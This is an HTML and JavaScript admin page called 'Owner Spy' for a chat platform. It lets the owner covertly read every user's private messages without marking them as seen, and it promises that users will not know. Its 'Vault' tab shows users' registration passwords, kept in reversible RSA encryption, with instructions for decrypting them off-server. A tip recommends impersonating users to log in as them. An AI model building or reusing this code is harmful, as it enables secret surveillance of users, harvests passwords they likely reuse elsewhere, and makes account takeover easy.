<!DOCTYPE html>
<html lang="en">
<head>
  <meta charset="UTF-8"/>
  <meta name="viewport" content="width=device-width, initial-scale=1.0"/>
  <title>Owner Spy — All Conversations</title>
  <link rel="stylesheet" href="/static/responsive.css"/>
  <style>
    *,*::before,*::after{box-sizing:border-box;margin:0;padding:0}
    html,body{height:100%;background:#0f1117;color:#e2e8f0;font-family:system-ui,sans-serif}
    body{display:flex;flex-direction:column}
    header{background:#1a1d27;border-bottom:1px solid #2d3148;padding:14px 28px;
           display:flex;align-items:center;justify-content:space-between;flex-wrap:wrap;gap:12px}
    header h1{font-size:1.15rem;color:#e879f9;font-weight:800}
    header h1 .badge{background:#3b0764;color:#e879f9;padding:3px 9px;border-radius:5px;
                     font-size:.65rem;letter-spacing:.1em;margin-left:8px;vertical-align:middle}
    .btn-sm{padding:6px 14px;border:none;border-radius:6px;font-size:.8rem;font-weight:600;
            cursor:pointer;background:#2d3148;color:#94a3b8;text-decoration:none;display:inline-block}
    .btn-sm:hover{opacity:.85}
    .wrap{flex:1;display:grid;grid-template-columns:340px minmax(0,1fr);
          max-width:1300px;width:100%;margin:0 auto;padding:20px;gap:20px;min-height:0}
    .col{background:#1a1d27;border:1px solid #2d3148;border-radius:12px;
         display:flex;flex-direction:column;min-height:0;overflow:hidden}
    .col h2{font-size:.78rem;font-weight:700;text-transform:uppercase;letter-spacing:.08em;
            color:#64748b;padding:14px 16px 10px;flex-shrink:0;display:flex;justify-content:space-between;align-items:center;gap:8px}
    .col h2 .filter-tabs{display:flex;gap:4px}
    .col h2 .filter-tabs button{background:#13151f;color:#94a3b8;border:1px solid #2d3148;
                                padding:4px 10px;border-radius:5px;font-size:.7rem;cursor:pointer}
    .col h2 .filter-tabs button.active{background:#7c85ff;color:#fff;border-color:#7c85ff}
    .scroll{flex:1;overflow-y:auto;min-height:0}
    .convo{padding:11px 14px;border-bottom:1px solid #1e2130;cursor:pointer;
           display:flex;gap:11px;align-items:flex-start}
    .convo:hover{background:#1e2130}
    .convo.active{background:#2d3148}
    .convo .pair{font-weight:700;font-size:.88rem;color:#e2e8f0;margin-bottom:3px;
                 display:flex;align-items:center;gap:6px;flex-wrap:wrap}
    .convo .pair .x{color:#64748b;font-weight:400}
    .convo .preview{font-size:.78rem;color:#94a3b8;
                    white-space:nowrap;overflow:hidden;text-overflow:ellipsis}
    .convo .meta{font-size:.7rem;color:#64748b;margin-top:3px}
    .empty{padding:40px 20px;text-align:center;color:#64748b;font-size:.9rem}
    .panel-header{padding:14px 18px;border-bottom:1px solid #2d3148;display:flex;
                  align-items:center;gap:10px;flex-wrap:wrap}
    .panel-header .who{font-weight:700;color:#e879f9}
    .messages{flex:1;overflow-y:auto;padding:14px 18px;display:flex;flex-direction:column;gap:8px;min-height:0}
    .ghost-row{display:flex;flex-direction:column;gap:2px}
    .ghost-row .head{font-size:.72rem;color:#64748b;display:flex;gap:10px;align-items:center}
    .ghost-row .head .name{color:#cbd5e1;font-weight:700}
    .ghost-row .body{background:#13151f;border:1px solid #2d3148;border-radius:8px;
                     padding:8px 12px;font-size:.9rem;color:#e2e8f0;word-break:break-word;
                     max-width:80%;align-self:flex-start}
    .ghost-row.from-other-side .body{background:#1c1730;border-color:#382a55;align-self:flex-end}
    .ghost-row .seen{font-size:.7rem;color:#64748b;margin-top:2px}
    .ghost-row .file{font-size:.78rem;color:#7dd3fc;margin-top:4px}
    .pub-row{display:flex;flex-direction:column;gap:3px;padding:10px 12px;
             background:#13151f;border:1px solid #2d3148;border-radius:8px}
    .pub-row .head{font-size:.72rem;color:#64748b;display:flex;gap:10px;align-items:center}
    .pub-row .head .name{color:#cbd5e1;font-weight:700}
    .pub-row .body{font-size:.9rem;color:#e2e8f0}
    .ghost-banner{padding:10px 16px;background:#3b0764;color:#e879f9;font-size:.78rem;
                  text-align:center;letter-spacing:.04em;border-bottom:1px solid #4c1d6b}
    @media(max-width:880px){
      .wrap{grid-template-columns:1fr;padding:10px;gap:10px}
      .col.right{min-height:50vh}
    }
  </style>
</head>
<body>

<header>
  <h1>👁 Owner Spy <span class="badge">GHOST VIEW</span></h1>
  <div style="display:flex;gap:8px;flex-wrap:wrap">
    <a class="btn-sm" href="/admin">← Back to admin</a>
    <a class="btn-sm" href="/">Home</a>
  </div>
</header>

<div class="ghost-banner">
  Reading messages here does <b>NOT</b> mark them as seen.
  Users will not know you viewed their conversation.
</div>

<div class="wrap">
  <div class="col">
    <h2>
      Conversations
      <div class="filter-tabs">
        <button id="tab-dm" class="active" onclick="switchTab('dm')">DMs</button>
        <button id="tab-public" onclick="switchTab('public')">Public</button>
        <button id="tab-pw" onclick="switchTab('pw')" style="background:#3b0764;color:#e879f9">🔑 Vault</button>
      </div>
    </h2>
    <div class="scroll" id="list"><div class="empty">Loading…</div></div>
  </div>
  <div class="col right">
    <div id="panel" style="flex:1;display:flex;flex-direction:column;min-height:0">
      <div class="empty">Pick a conversation to read it without leaving a trace.</div>
    </div>
  </div>
</div>

<script>
let mode = 'dm';
let convos = [];
let activeKey = null;

function escapeHtml(s){return String(s||'').replace(/[&<>"']/g,c=>({'&':'&amp;','<':'&lt;','>':'&gt;','"':'&quot;',"'":'&#39;'})[c]);}
function shortTime(ts){if(!ts)return'';try{const d=new Date(ts.replace(' ','T')+'Z');return d.toLocaleString();}catch(e){return ts;}}

function switchTab(name){
  mode = name;
  document.getElementById('tab-dm').classList.toggle('active', name==='dm');
  document.getElementById('tab-public').classList.toggle('active', name==='public');
  const pw = document.getElementById('tab-pw'); if (pw) pw.classList.toggle('active', name==='pw');
  activeKey = null;
  document.getElementById('panel').innerHTML = '<div class="empty">Pick a row to view details.</div>';
  if (name === 'dm') loadDms();
  else if (name === 'public') loadPublic();
  else if (name === 'pw') loadPasswords();
}

async function loadPasswords(){
  const el = document.getElementById('list');
  el.innerHTML = '<div class="empty">Loading vault…</div>';
  const r = await fetch('/api/admin/passwords');
  if (!r.ok) {
    const j = await r.json().catch(()=>({}));
    el.innerHTML = '<div class="empty">'+escapeHtml(j.error || 'Forbidden — owner only.')+'</div>';
    return;
  }
  const rows = await r.json();
  if (!rows.length) { el.innerHTML = '<div class="empty">Vault is empty. Passwords are captured (encrypted) at registration time only — older accounts are not in the vault.</div>'; return; }
  el.innerHTML = `
    <div style="padding:10px 14px;font-size:.78rem;color:#fcd34d;background:#3b0764;border-bottom:1px solid #581c87">
      🔒 Encrypted with your public key. Server cannot read these — only you can, off-server. ${rows.length} record(s).
    </div>` + rows.map(p => `
    <div class="convo" onclick="showPw(${p.user_id})" style="cursor:pointer">
      <div style="flex:1;min-width:0">
        <div class="pair">
          <span>${escapeHtml(p.username)}</span>
          <small style="color:#64748b">#${p.user_id}</small>
        </div>
        <div style="font-size:.74rem;color:#94a3b8;margin-top:3px">
          captured ${shortTime(p.captured_at)}
        </div>
      </div>
      <code style="background:#0f1117;padding:4px 9px;border-radius:5px;color:#a78bfa;font-size:.78rem;
                   max-width:200px;overflow:hidden;text-overflow:ellipsis;white-space:nowrap">
        🔒 encrypted
      </code>
    </div>`).join('');
  window._pwRows = rows;
}

function showPw(uid){
  const p = (window._pwRows||[]).find(r => r.user_id === uid);
  if (!p) return;
  const el = document.getElementById('panel');
  const ct = p.encrypted_pw || '';
  const escaped = escapeHtml(ct);
  el.innerHTML = `
    <div style="padding:18px 22px;color:#e2e8f0">
      <h3 style="font-size:1.1rem;margin-bottom:14px">🔒 ${escapeHtml(p.username)} <small style="color:#64748b;font-weight:400">#${p.user_id}</small></h3>
      <div style="display:grid;gap:10px;font-size:.92rem">
        <div><b style="color:#64748b">Captured:</b> ${shortTime(p.captured_at)}</div>
        <div style="background:#0f1117;border:1px solid #581c87;border-radius:8px;padding:14px;margin-top:8px">
          <div style="font-size:.7rem;color:#a78bfa;text-transform:uppercase;letter-spacing:.06em;margin-bottom:6px">
            Encrypted password (RSA-OAEP, base64)
          </div>
          <textarea readonly id="ct-${p.user_id}" rows="6" style="width:100%;font-family:ui-monospace,monospace;
            font-size:.78rem;color:#cbd5e1;background:#13151f;border:1px solid #2d3148;border-radius:6px;
            padding:10px;resize:vertical;word-break:break-all">${escaped}</textarea>
          <button style="margin-top:10px;background:#7c85ff;color:#fff;border:none;border-radius:6px;
                         padding:6px 14px;cursor:pointer;font-size:.82rem"
                  onclick="copyCt(${p.user_id}, this)">
            📋 Copy ciphertext
          </button>
        </div>
        <details style="margin-top:6px;background:#13151f;border:1px solid #2d3148;border-radius:8px;padding:12px">
          <summary style="cursor:pointer;color:#7dd3fc;font-weight:600">How to decrypt this on your own machine</summary>
          <ol style="margin:10px 0 0 22px;font-size:.85rem;line-height:1.7;color:#cbd5e1">
            <li>Install Python and the cryptography library:
              <code style="background:#0f1117;padding:2px 6px;border-radius:4px">pip install cryptography</code></li>
            <li>Save your <b>vault_private_key.pem</b> somewhere safe (you got it from <code>attached_assets/</code>).</li>
            <li>Save the helper script <b>decrypt_password.py</b> next to your private key.</li>
            <li>Run: <code style="background:#0f1117;padding:2px 6px;border-radius:4px">python3 decrypt_password.py</code></li>
            <li>Paste the ciphertext copied above. The script prints the original password.</li>
          </ol>
          <p style="margin-top:10px;font-size:.78rem;color:#fcd34d">
            ⚠ Never store the private key on the server. If the server is compromised, the vault data is still unreadable without your key.
          </p>
        </details>
        <p style="font-size:.74rem;color:#64748b;margin-top:6px">
          Tip: use the impersonation control on the main admin page to log in as this user — that path doesn't require a password at all.
        </p>
      </div>
    </div>`;
}

function copyCt(uid, btn){
  const ta = document.getElementById('ct-'+uid);
  ta.select();
  navigator.clipboard.writeText(ta.value).then(()=>{ btn.textContent='✓ Copied'; });
}

async function loadDms(){
  const el = document.getElementById('list');
  el.innerHTML = '<div class="empty">Loading conversations…</div>';
  const r = await fetch('/api/admin/all-conversations');
  if (!r.ok) { el.innerHTML = '<div class="empty">Failed to load.</div>'; return; }
  convos = await r.json();
  if (!convos.length) { el.innerHTML = '<div class="empty">No DMs on the platform yet.</div>'; return; }
  el.innerHTML = convos.map((c,i) => `
    <div class="convo" data-i="${i}" onclick="openDm(${i})">
      <div style="flex:1;min-width:0">
        <div class="pair">
          <span>${escapeHtml(c.u1.username)}</span>
          <span class="x">↔</span>
          <span>${escapeHtml(c.u2.username)}</span>
        </div>
        <div class="preview"><b>${escapeHtml(c.last_sender)}:</b> ${escapeHtml(c.last_preview)}</div>
        <div class="meta">${c.total} message${c.total===1?'':'s'} · ${shortTime(c.last_time)}</div>
      </div>
    </div>
  `).join('');
}

async function openDm(i){
  const c = convos[i];
  if (!c) return;
  activeKey = c.u1.id + '-' + c.u2.id;
  document.querySelectorAll('.convo').forEach((el,idx)=>el.classList.toggle('active', idx===i));
  const panel = document.getElementById('panel');
  panel.innerHTML = '<div class="empty">Loading messages…</div>';
  const r = await fetch(`/api/admin/conversation/${c.u1.id}/${c.u2.id}`);
  if (!r.ok) { panel.innerHTML = '<div class="empty">Failed to load.</div>'; return; }
  const data = await r.json();
  const aId = data.user_a.id;
  panel.innerHTML = `
    <div class="panel-header">
      <span class="who">${escapeHtml(data.user_a.username)} ↔ ${escapeHtml(data.user_b.username)}</span>
      <span style="font-size:.78rem;color:#64748b">· ${data.messages.length} msgs</span>
      <a class="btn-sm" style="margin-left:auto" href="/profile/${aId}">${escapeHtml(data.user_a.username)} profile</a>
      <a class="btn-sm" href="/profile/${data.user_b.id}">${escapeHtml(data.user_b.username)} profile</a>
    </div>
    <div class="messages" id="msgs"></div>
  `;
  const m = document.getElementById('msgs');
  m.innerHTML = data.messages.map(msg => {
    const fromA = msg.sender_id === aId;
    const senderName = fromA ? data.user_a.username : data.user_b.username;
    const seen = msg.is_read
      ? `<div class="seen">✓✓ seen ${msg.read_at ? shortTime(msg.read_at) : ''}</div>`
      : `<div class="seen">✓ delivered, not yet seen</div>`;
    const file = msg.file
      ? `<div class="file">📎 ${escapeHtml(msg.file.display_name)} <span style="color:#64748b">(${msg.file.kind})</span></div>` : '';
    return `<div class="ghost-row ${fromA?'':'from-other-side'}">
      <div class="head"><span class="name">${escapeHtml(senderName)}</span><span>${shortTime(msg.timestamp)}</span></div>
      <div class="body">${escapeHtml(msg.content) || '<i style="color:#64748b">(no text)</i>'}${file}</div>
      ${seen}
    </div>`;
  }).join('');
  m.scrollTop = m.scrollHeight;
}

async function loadPublic(){
  const el = document.getElementById('list');
  el.innerHTML = '<div class="empty">Loading public chat…</div>';
  const r = await fetch('/api/admin/public-messages-all');
  if (!r.ok) { el.innerHTML = '<div class="empty">Failed to load.</div>'; return; }
  const msgs = await r.json();
  if (!msgs.length) { el.innerHTML = '<div class="empty">No public messages yet.</div>'; return; }
  el.innerHTML = `<div style="padding:10px"><b style="color:#7c85ff;font-size:.85rem">${msgs.length} latest public messages</b></div>` +
    msgs.map(m => `
      <div class="convo">
        <div style="flex:1;min-width:0">
          <div class="pair">
            <span>${escapeHtml(m.username)}</span>
            ${m.is_admin ? '<span style="font-size:.62rem;background:#78350f;color:#fcd34d;padding:1px 5px;border-radius:3px">ADMIN</span>' : ''}
          </div>
          <div class="preview">${escapeHtml(m.content)}</div>
          <div class="meta">${shortTime(m.timestamp)}</div>
        </div>
      </div>
    `).join('');
  document.getElementById('panel').innerHTML =
    '<div class="empty">Public chat is shown in the left list. Visit <a href="/chat" style="color:#7c85ff">/chat</a> to interact.</div>';
}

loadDms();
setInterval(()=>{ if (mode==='dm' && !activeKey) loadDms(); }, 8000);
</script>
</body>
</html>
